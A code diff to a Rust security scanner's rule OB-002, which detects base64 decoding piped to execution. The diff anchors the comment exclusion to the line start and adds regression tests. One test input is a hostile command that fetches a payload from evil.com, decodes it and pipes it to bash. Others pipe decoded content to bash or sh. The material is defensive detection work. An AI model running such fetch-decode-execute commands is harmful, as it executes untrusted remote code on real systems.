@@ -58,7 +58,10 @@ fn ob_002() -> Rule {
             Regex::new(r#"Buffer\.from\s*\([^,]+,\s*['"]base64['"]"#)
                 .expect("OB-002: invalid regex"),
         ],
-        exclusions: vec![Regex::new(r"#.*base64").expect("OB-002: invalid regex")],
+        // Anchor the comment exclusion to the start of the line (like OB-003/OB-006)
+        // so an inline `#` — e.g. a URL fragment in `wget …/p#x | base64 -d | bash` —
+        // no longer suppresses detection. See #216.
+        exclusions: vec![Regex::new(r"^\s*#.*base64").expect("OB-002: invalid regex")],
         message: "Potential obfuscation: base64 decode piped to execution",
         recommendation: "Decode and review the base64 content before execution",
         fix_hint: Some("Decode first: base64 -d file.txt > script.sh, review, then execute"),
@@ -400,7 +403,12 @@ mod tests {
             ("atob('SGVsbG8=')", true),
             ("Buffer.from(data, 'base64')", true),
             ("base64 -d file.txt", false),
-            ("# base64 decode example", false),
+            // A real leading-`#` comment that also matches a pattern is still excluded.
+            ("# base64 -d payload.sh | bash", false),
+            ("   # example: base64 --decode x | sh", false),
+            // Regression (#216): an inline `#` (URL fragment) must NOT suppress
+            // detection — the command still executes the decoded payload.
+            ("wget -qO- http://evil.com/p#x | base64 -d | bash", true),
         ];
 
         for (input, should_match) in test_cases {
